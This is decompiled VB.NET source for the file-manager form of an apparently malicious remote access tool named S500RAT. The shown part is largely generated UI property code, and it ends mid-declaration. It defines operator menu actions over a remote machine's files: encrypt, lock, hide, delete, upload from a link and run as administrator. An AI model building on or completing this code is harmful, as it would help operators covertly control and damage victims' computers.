Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Text
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200001A RID: 26
	<DesignerGenerated()>
	Public Partial Class FormFileManager
		Inherits Form

		' Token: 0x17000122 RID: 290
		' (get) Token: 0x060002AF RID: 687 RVA: 0x00018D44 File Offset: 0x00016F44
		' (set) Token: 0x060002B0 RID: 688 RVA: 0x00018D4E File Offset: 0x00016F4E
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000123 RID: 291
		' (get) Token: 0x060002B1 RID: 689 RVA: 0x00018D57 File Offset: 0x00016F57
		' (set) Token: 0x060002B2 RID: 690 RVA: 0x00018D61 File Offset: 0x00016F61
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000124 RID: 292
		' (get) Token: 0x060002B3 RID: 691 RVA: 0x00018D6A File Offset: 0x00016F6A
		' (set) Token: 0x060002B4 RID: 692 RVA: 0x00018D74 File Offset: 0x00016F74
		Friend Overridable Property MeduamIcons As Guna2ImageButton
			<CompilerGenerated()>
			Get
				Return Me._MeduamIcons
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ImageButton)
				Dim value2 As EventHandler = AddressOf Me.MeduamIcons_Click
				Dim meduamIcons As Guna2ImageButton = Me._MeduamIcons
				If meduamIcons IsNot Nothing Then
					RemoveHandler meduamIcons.Click, value2
				End If
				Me._MeduamIcons = value
				meduamIcons = Me._MeduamIcons
				If meduamIcons IsNot Nothing Then
					AddHandler meduamIcons.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000125 RID: 293
		' (get) Token: 0x060002B5 RID: 693 RVA: 0x00018DB7 File Offset: 0x00016FB7
		' (set) Token: 0x060002B6 RID: 694 RVA: 0x00018DC4 File Offset: 0x00016FC4
		Friend Overridable Property ListIcons As Guna2ImageButton
			<CompilerGenerated()>
			Get
				Return Me._ListIcons
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ImageButton)
				Dim value2 As EventHandler = AddressOf Me.ListIcons_Click
				Dim listIcons As Guna2ImageButton = Me._ListIcons
				If listIcons IsNot Nothing Then
					RemoveHandler listIcons.Click, value2
				End If
				Me._ListIcons = value
				listIcons = Me._ListIcons
				If listIcons IsNot Nothing Then
					AddHandler listIcons.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000126 RID: 294
		' (get) Token: 0x060002B7 RID: 695 RVA: 0x00018E07 File Offset: 0x00017007
		' (set) Token: 0x060002B8 RID: 696 RVA: 0x00018E11 File Offset: 0x00017011
		Friend Overridable Property pr As Guna2ProgressBar

		' Token: 0x17000127 RID: 295
		' (get) Token: 0x060002B9 RID: 697 RVA: 0x00018E1A File Offset: 0x0001701A
		' (set) Token: 0x060002BA RID: 698 RVA: 0x00018E24 File Offset: 0x00017024
		Friend Overridable Property ButtionPC As Guna2ImageButton
			<CompilerGenerated()>
			Get
				Return Me._ButtionPC
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ImageButton)
				Dim value2 As EventHandler = AddressOf Me.ButtionPC_Click
				Dim buttionPC As Guna2ImageButton = Me._ButtionPC
				If buttionPC IsNot Nothing Then
					RemoveHandler buttionPC.Click, value2
				End If
				Me._ButtionPC = value
				buttionPC = Me._ButtionPC
				If buttionPC IsNot Nothing Then
					AddHandler buttionPC.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000128 RID: 296
		' (get) Token: 0x060002BB RID: 699 RVA: 0x00018E67 File Offset: 0x00017067
		' (set) Token: 0x060002BC RID: 700 RVA: 0x00018E74 File Offset: 0x00017074
		Friend Overridable Property Search As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._Search
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.Search_TextChanged
				Dim value3 As KeyPressEventHandler = AddressOf Me.Search_KeyPress
				Dim search As Guna2TextBox = Me._Search
				If search IsNot Nothing Then
					RemoveHandler search.TextChanged, value2
					RemoveHandler search.KeyPress, value3
				End If
				Me._Search = value
				search = Me._Search
				If search IsNot Nothing Then
					AddHandler search.TextChanged, value2
					AddHandler search.KeyPress, value3
				End If
			End Set
		End Property

		' Token: 0x17000129 RID: 297
		' (get) Token: 0x060002BD RID: 701 RVA: 0x00018ED2 File Offset: 0x000170D2
		' (set) Token: 0x060002BE RID: 702 RVA: 0x00018EDC File Offset: 0x000170DC
		Friend Overridable Property TextBox1 As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._TextBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.TextBox1_IconLeftClick
				Dim value3 As EventHandler = AddressOf Me.TextBox1_IconRightClick
				Dim textBox As Guna2TextBox = Me._TextBox1
				If textBox IsNot Nothing Then
					RemoveHandler textBox.IconLeftClick, value2
					RemoveHandler textBox.IconRightClick, value3
				End If
				Me._TextBox1 = value
				textBox = Me._TextBox1
				If textBox IsNot Nothing Then
					AddHandler textBox.IconLeftClick, value2
					AddHandler textBox.IconRightClick, value3
				End If
			End Set
		End Property

		' Token: 0x1700012A RID: 298
		' (get) Token: 0x060002BF RID: 703 RVA: 0x00018F3A File Offset: 0x0001713A
		' (set) Token: 0x060002C0 RID: 704 RVA: 0x00018F44 File Offset: 0x00017144
		Friend Overridable Property L2 As ListView
			<CompilerGenerated()>
			Get
				Return Me._L2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ListView)
				Dim value2 As MouseEventHandler = AddressOf Me.L2_MouseDoubleClick
				Dim l As ListView = Me._L2
				If l IsNot Nothing Then
					RemoveHandler l.MouseDoubleClick, value2
				End If
				Me._L2 = value
				l = Me._L2
				If l IsNot Nothing Then
					AddHandler l.MouseDoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x1700012B RID: 299
		' (get) Token: 0x060002C1 RID: 705 RVA: 0x00018F87 File Offset: 0x00017187
		' (set) Token: 0x060002C2 RID: 706 RVA: 0x00018F91 File Offset: 0x00017191
		Friend Overridable Property ColumnHeader1 As ColumnHeader

		' Token: 0x1700012C RID: 300
		' (get) Token: 0x060002C3 RID: 707 RVA: 0x00018F9A File Offset: 0x0001719A
		' (set) Token: 0x060002C4 RID: 708 RVA: 0x00018FA4 File Offset: 0x000171A4
		Friend Overridable Property ColumnHeader2 As ColumnHeader

		' Token: 0x1700012D RID: 301
		' (get) Token: 0x060002C5 RID: 709 RVA: 0x00018FAD File Offset: 0x000171AD
		' (set) Token: 0x060002C6 RID: 710 RVA: 0x00018FB7 File Offset: 0x000171B7
		Friend Overridable Property ColumnHeader3 As ColumnHeader

		' Token: 0x1700012E RID: 302
		' (get) Token: 0x060002C7 RID: 711 RVA: 0x00018FC0 File Offset: 0x000171C0
		' (set) Token: 0x060002C8 RID: 712 RVA: 0x00018FCA File Offset: 0x000171CA
		Friend Overridable Property ColumnHeader6 As ColumnHeader

		' Token: 0x1700012F RID: 303
		' (get) Token: 0x060002C9 RID: 713 RVA: 0x00018FD3 File Offset: 0x000171D3
		' (set) Token: 0x060002CA RID: 714 RVA: 0x00018FDD File Offset: 0x000171DD
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000130 RID: 304
		' (get) Token: 0x060002CB RID: 715 RVA: 0x00018FE6 File Offset: 0x000171E6
		' (set) Token: 0x060002CC RID: 716 RVA: 0x00018FF0 File Offset: 0x000171F0
		Friend Overridable Property MG As ImageList

		' Token: 0x17000131 RID: 305
		' (get) Token: 0x060002CD RID: 717 RVA: 0x00018FF9 File Offset: 0x000171F9
		' (set) Token: 0x060002CE RID: 718 RVA: 0x00019003 File Offset: 0x00017203
		Friend Overridable Property ContextMenuControl As ContextMenuStrip

		' Token: 0x17000132 RID: 306
		' (get) Token: 0x060002CF RID: 719 RVA: 0x0001900C File Offset: 0x0001720C
		' (set) Token: 0x060002D0 RID: 720 RVA: 0x00019016 File Offset: 0x00017216
		Friend Overridable Property COpen As ToolStripMenuItem

		' Token: 0x17000133 RID: 307
		' (get) Token: 0x060002D1 RID: 721 RVA: 0x0001901F File Offset: 0x0001721F
		' (set) Token: 0x060002D2 RID: 722 RVA: 0x0001902C File Offset: 0x0001722C
		Friend Overridable Property CAddArchive As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CAddArchive
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CAddArchive_Click
				Dim caddArchive As ToolStripMenuItem = Me._CAddArchive
				If caddArchive IsNot Nothing Then
					RemoveHandler caddArchive.Click, value2
				End If
				Me._CAddArchive = value
				caddArchive = Me._CAddArchive
				If caddArchive IsNot Nothing Then
					AddHandler caddArchive.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000134 RID: 308
		' (get) Token: 0x060002D3 RID: 723 RVA: 0x0001906F File Offset: 0x0001726F
		' (set) Token: 0x060002D4 RID: 724 RVA: 0x0001907C File Offset: 0x0001727C
		Friend Overridable Property CNormal As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CNormal
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CNormal_Click
				Dim cnormal As ToolStripMenuItem = Me._CNormal
				If cnormal IsNot Nothing Then
					RemoveHandler cnormal.Click, value2
				End If
				Me._CNormal = value
				cnormal = Me._CNormal
				If cnormal IsNot Nothing Then
					AddHandler cnormal.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000135 RID: 309
		' (get) Token: 0x060002D5 RID: 725 RVA: 0x000190BF File Offset: 0x000172BF
		' (set) Token: 0x060002D6 RID: 726 RVA: 0x000190CC File Offset: 0x000172CC
		Friend Overridable Property CHiden As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CHiden
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CHiden_Click
				Dim chiden As ToolStripMenuItem = Me._CHiden
				If chiden IsNot Nothing Then
					RemoveHandler chiden.Click, value2
				End If
				Me._CHiden = value
				chiden = Me._CHiden
				If chiden IsNot Nothing Then
					AddHandler chiden.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000136 RID: 310
		' (get) Token: 0x060002D7 RID: 727 RVA: 0x0001910F File Offset: 0x0001730F
		' (set) Token: 0x060002D8 RID: 728 RVA: 0x0001911C File Offset: 0x0001731C
		Friend Overridable Property CRunAdmin As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CRunAdmin
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CRunAdmin_Click
				Dim crunAdmin As ToolStripMenuItem = Me._CRunAdmin
				If crunAdmin IsNot Nothing Then
					RemoveHandler crunAdmin.Click, value2
				End If
				Me._CRunAdmin = value
				crunAdmin = Me._CRunAdmin
				If crunAdmin IsNot Nothing Then
					AddHandler crunAdmin.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000137 RID: 311
		' (get) Token: 0x060002D9 RID: 729 RVA: 0x0001915F File Offset: 0x0001735F
		' (set) Token: 0x060002DA RID: 730 RVA: 0x0001916C File Offset: 0x0001736C
		Friend Overridable Property CExtractHere As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CExtractHere
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CExtractHere_Click
				Dim cextractHere As ToolStripMenuItem = Me._CExtractHere
				If cextractHere IsNot Nothing Then
					RemoveHandler cextractHere.Click, value2
				End If
				Me._CExtractHere = value
				cextractHere = Me._CExtractHere
				If cextractHere IsNot Nothing Then
					AddHandler cextractHere.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000138 RID: 312
		' (get) Token: 0x060002DB RID: 731 RVA: 0x000191AF File Offset: 0x000173AF
		' (set) Token: 0x060002DC RID: 732 RVA: 0x000191B9 File Offset: 0x000173B9
		Friend Overridable Property CFilesexcrypt As ToolStripMenuItem

		' Token: 0x17000139 RID: 313
		' (get) Token: 0x060002DD RID: 733 RVA: 0x000191C2 File Offset: 0x000173C2
		' (set) Token: 0x060002DE RID: 734 RVA: 0x000191CC File Offset: 0x000173CC
		Friend Overridable Property CEncrypt As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CEncrypt
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CEncrypt_Click
				Dim cencrypt As ToolStripMenuItem = Me._CEncrypt
				If cencrypt IsNot Nothing Then
					RemoveHandler cencrypt.Click, value2
				End If
				Me._CEncrypt = value
				cencrypt = Me._CEncrypt
				If cencrypt IsNot Nothing Then
					AddHandler cencrypt.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013A RID: 314
		' (get) Token: 0x060002DF RID: 735 RVA: 0x0001920F File Offset: 0x0001740F
		' (set) Token: 0x060002E0 RID: 736 RVA: 0x0001921C File Offset: 0x0001741C
		Friend Overridable Property CDecrypt As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CDecrypt
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CDecrypt_Click
				Dim cdecrypt As ToolStripMenuItem = Me._CDecrypt
				If cdecrypt IsNot Nothing Then
					RemoveHandler cdecrypt.Click, value2
				End If
				Me._CDecrypt = value
				cdecrypt = Me._CDecrypt
				If cdecrypt IsNot Nothing Then
					AddHandler cdecrypt.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013B RID: 315
		' (get) Token: 0x060002E1 RID: 737 RVA: 0x0001925F File Offset: 0x0001745F
		' (set) Token: 0x060002E2 RID: 738 RVA: 0x00019269 File Offset: 0x00017469
		Friend Overridable Property CFolderLock As ToolStripMenuItem

		' Token: 0x1700013C RID: 316
		' (get) Token: 0x060002E3 RID: 739 RVA: 0x00019272 File Offset: 0x00017472
		' (set) Token: 0x060002E4 RID: 740 RVA: 0x0001927C File Offset: 0x0001747C
		Friend Overridable Property CLock As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CLock
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CLock_Click
				Dim clock As ToolStripMenuItem = Me._CLock
				If clock IsNot Nothing Then
					RemoveHandler clock.Click, value2
				End If
				Me._CLock = value
				clock = Me._CLock
				If clock IsNot Nothing Then
					AddHandler clock.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013D RID: 317
		' (get) Token: 0x060002E5 RID: 741 RVA: 0x000192BF File Offset: 0x000174BF
		' (set) Token: 0x060002E6 RID: 742 RVA: 0x000192CC File Offset: 0x000174CC
		Friend Overridable Property cUnlock As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._cUnlock
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CUnlock_Click
				Dim cUnlock As ToolStripMenuItem = Me._cUnlock
				If cUnlock IsNot Nothing Then
					RemoveHandler cUnlock.Click, value2
				End If
				Me._cUnlock = value
				cUnlock = Me._cUnlock
				If cUnlock IsNot Nothing Then
					AddHandler cUnlock.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013E RID: 318
		' (get) Token: 0x060002E7 RID: 743 RVA: 0x0001930F File Offset: 0x0001750F
		' (set) Token: 0x060002E8 RID: 744 RVA: 0x0001931C File Offset: 0x0001751C
		Friend Overridable Property CDownload As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CDownload
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CDownload_Click
				Dim cdownload As ToolStripMenuItem = Me._CDownload
				If cdownload IsNot Nothing Then
					RemoveHandler cdownload.Click, value2
				End If
				Me._CDownload = value
				cdownload = Me._CDownload
				If cdownload IsNot Nothing Then
					AddHandler cdownload.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013F RID: 319
		' (get) Token: 0x060002E9 RID: 745 RVA: 0x0001935F File Offset: 0x0001755F
		' (set) Token: 0x060002EA RID: 746 RVA: 0x0001936C File Offset: 0x0001756C
		Friend Overridable Property CUploadFromLink As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CUploadFromLink
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CUploadFromLink_Click
				Dim cuploadFromLink As ToolStripMenuItem = Me._CUploadFromLink
				If cuploadFromLink IsNot Nothing Then
					RemoveHandler cuploadFromLink.Click, value2
				End If
				Me._CUploadFromLink = value
				cuploadFromLink = Me._CUploadFromLink
				If cuploadFromLink IsNot Nothing Then
					AddHandler cuploadFromLink.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000140 RID: 320
		' (get) Token: 0x060002EB RID: 747 RVA: 0x000193AF File Offset: 0x000175AF
		' (set) Token: 0x060002EC RID: 748 RVA: 0x000193BC File Offset: 0x000175BC
		Friend Overridable Property CUpload As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CUpload
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CUpload_Click
				Dim cupload As ToolStripMenuItem = Me._CUpload
				If cupload IsNot Nothing Then
					RemoveHandler cupload.Click, value2
				End If
				Me._CUpload = value
				cupload = Me._CUpload
				If cupload IsNot Nothing Then
					AddHandler cupload.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000141 RID: 321
		' (get) Token: 0x060002ED RID: 749 RVA: 0x000193FF File Offset: 0x000175FF
		' (set) Token: 0x060002EE RID: 750 RVA: 0x0001940C File Offset: 0x0001760C
		Friend Overridable Property CRename As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CRename
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CRename_Click
				Dim crename As ToolStripMenuItem = Me._CRename
				If crename IsNot Nothing Then
					RemoveHandler crename.Click, value2
				End If
				Me._CRename = value
				crename = Me._CRename
				If crename IsNot Nothing Then
					AddHandler crename.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000142 RID: 322
		' (get) Token: 0x060002EF RID: 751 RVA: 0x0001944F File Offset: 0x0001764F
		' (set) Token: 0x060002F0 RID: 752 RVA: 0x0001945C File Offset: 0x0001765C
		Friend Overridable Property CEditor As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CEditor
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CEditor_Click
				Dim ceditor As ToolStripMenuItem = Me._CEditor
				If ceditor IsNot Nothing Then
					RemoveHandler ceditor.Click, value2
				End If
				Me._CEditor = value
				ceditor = Me._CEditor
				If ceditor IsNot Nothing Then
					AddHandler ceditor.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000143 RID: 323
		' (get) Token: 0x060002F1 RID: 753 RVA: 0x0001949F File Offset: 0x0001769F
		' (set) Token: 0x060002F2 RID: 754 RVA: 0x000194AC File Offset: 0x000176AC
		Friend Overridable Property CCopy As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CCopy
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CCopy_Click
				Dim ccopy As ToolStripMenuItem = Me._CCopy
				If ccopy IsNot Nothing Then
					RemoveHandler ccopy.Click, value2
				End If
				Me._CCopy = value
				ccopy = Me._CCopy
				If ccopy IsNot Nothing Then
					AddHandler ccopy.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000144 RID: 324
		' (get) Token: 0x060002F3 RID: 755 RVA: 0x000194EF File Offset: 0x000176EF
		' (set) Token: 0x060002F4 RID: 756 RVA: 0x000194FC File Offset: 0x000176FC
		Friend Overridable Property CCut As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CCut
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CCut_Click
				Dim ccut As ToolStripMenuItem = Me._CCut
				If ccut IsNot Nothing Then
					RemoveHandler ccut.Click, value2
				End If
				Me._CCut = value
				ccut = Me._CCut
				If ccut IsNot Nothing Then
					AddHandler ccut.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000145 RID: 325
		' (get) Token: 0x060002F5 RID: 757 RVA: 0x0001953F File Offset: 0x0001773F
		' (set) Token: 0x060002F6 RID: 758 RVA: 0x0001954C File Offset: 0x0001774C
		Friend Overridable Property CPast As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CPast
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CPast_Click
				Dim cpast As ToolStripMenuItem = Me._CPast
				If cpast IsNot Nothing Then
					RemoveHandler cpast.Click, value2
				End If
				Me._CPast = value
				cpast = Me._CPast
				If cpast IsNot Nothing Then
					AddHandler cpast.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000146 RID: 326
		' (get) Token: 0x060002F7 RID: 759 RVA: 0x0001958F File Offset: 0x0001778F
		' (set) Token: 0x060002F8 RID: 760 RVA: 0x00019599 File Offset: 0x00017799
		Friend Overridable Property CNew As ToolStripMenuItem

		' Token: 0x17000147 RID: 327
		' (get) Token: 0x060002F9 RID: 761 RVA: 0x000195A2 File Offset: 0x000177A2
		' (set) Token: 0x060002FA RID: 762 RVA: 0x000195AC File Offset: 0x000177AC
		Friend Overridable Property CNewFolder As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CNewFolder
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CNewFolder_Click
				Dim cnewFolder As ToolStripMenuItem = Me._CNewFolder
				If cnewFolder IsNot Nothing Then
					RemoveHandler cnewFolder.Click, value2
				End If
				Me._CNewFolder = value
				cnewFolder = Me._CNewFolder
				If cnewFolder IsNot Nothing Then
					AddHandler cnewFolder.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000148 RID: 328
		' (get) Token: 0x060002FB RID: 763 RVA: 0x000195EF File Offset: 0x000177EF
		' (set) Token: 0x060002FC RID: 764 RVA: 0x000195FC File Offset: 0x000177FC
		Friend Overridable Property CNewEmptyFile As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CNewEmptyFile
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CNewEmptyFile_Click
				Dim cnewEmptyFile As ToolStripMenuItem = Me._CNewEmptyFile
				If cnewEmptyFile IsNot Nothing Then
					RemoveHandler cnewEmptyFile.Click, value2
				End If
				Me._CNewEmptyFile = value
				cnewEmptyFile = Me._CNewEmptyFile
				If cnewEmptyFile IsNot Nothing Then
					AddHandler cnewEmptyFile.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000149 RID: 329
		' (get) Token: 0x060002FD RID: 765 RVA: 0x0001963F File Offset: 0x0001783F
		' (set) Token: 0x060002FE RID: 766 RVA: 0x0001964C File Offset: 0x0001784C
		Friend Overridable Property CShortCut As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CShortCut
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CShortCut_Click
				Dim cshortCut As ToolStripMenuItem = Me._CShortCut
				If cshortCut IsNot Nothing Then
					RemoveHandler cshortCut.Click, value2
				End If
				Me._CShortCut = value
				cshortCut = Me._CShortCut
				If cshortCut IsNot Nothing Then
					AddHandler cshortCut.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700014A RID: 330
		' (get) Token: 0x060002FF RID: 767 RVA: 0x0001968F File Offset: 0x0001788F
		' (set) Token: 0x06000300 RID: 768 RVA: 0x0001969C File Offset: 0x0001789C
		Friend Overridable Property CHide As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CHide
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CHide_Click
				Dim chide As ToolStripMenuItem = Me._CHide
				If chide IsNot Nothing Then
					RemoveHandler chide.Click, value2
				End If
				Me._CHide = value
				chide = Me._CHide
				If chide IsNot Nothing Then
					AddHandler chide.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700014B RID: 331
		' (get) Token: 0x06000301 RID: 769 RVA: 0x000196DF File Offset: 0x000178DF
		' (set) Token: 0x06000302 RID: 770 RVA: 0x000196EC File Offset: 0x000178EC
		Friend Overridable Property CShow As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CShow
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CShow_Click
				Dim cshow As ToolStripMenuItem = Me._CShow
				If cshow IsNot Nothing Then
					RemoveHandler cshow.Click, value2
				End If
				Me._CShow = value
				cshow = Me._CShow
				If cshow IsNot Nothing Then
					AddHandler cshow.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700014C RID: 332
		' (get) Token: 0x06000303 RID: 771 RVA: 0x0001972F File Offset: 0x0001792F
		' (set) Token: 0x06000304 RID: 772 RVA: 0x0001973C File Offset: 0x0001793C
		Friend Overridable Property CDelete As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CDelete
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CDelete_Click
				Dim cdelete As ToolStripMenuItem = Me._CDelete
				If cdelete IsNot Nothing Then
					RemoveHandler cdelete.Click, value2
				End If
				Me._CDelete = value
				cdelete = Me._CDelete
				If cdelete IsNot Nothing Then
					AddHandler cdelete.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700014D RID: 333
		' (get) Token: 0x06000305 RID: 773 RVA: 0x0001977F File Offset: 0x0001797F
		' (set) Token: 0x06000306 RID: 774 RVA: 0x0001978C File Offset: 0x0001798C
		Friend Overridable Property COpenDownloadFolder As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._COpenDownloadFolder
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.COpenDownloadFolder_Click
				Dim copenDownloadFolder As ToolStripMenuItem = Me._COpenDownloadFolder
				If copenDownloadFolder IsNot Nothing Then
					RemoveHandler copenDownloadFolder.Click, value2
				End If
				Me._COpenDownloadFolder = value
				copenDownloadFolder = Me._COpenDownloadFolder
				If copenDownloadFolder IsNot Nothing Then
					AddHandler copenDownloadFolder.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700014E RID: 334
		' (get) Token: 0x06000307 RID: 775 RVA: 0x000197CF File Offset: 0x000179CF
		' (set) Token: 0x06000308 RID: 776 RVA: 0x000197DC File Offset: 0x000179DC
		Friend Overridable Property CRefresh As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CRefresh
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CRefresh_Click
				Dim crefresh As ToolStripMenuItem = Me._CRefresh
				If crefresh IsNot Nothing Then
					RemoveHandler crefresh.Click, value2
				End If
				Me._CRefresh = value
				crefresh = Me._CRefresh
				If crefresh IsNot Nothing Then
					AddHandler crefresh.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700014F RID: 335
		' (get) Token: 0x06000309 RID: 777 RVA: 0x0001981F File Offset: 0x00017A1F
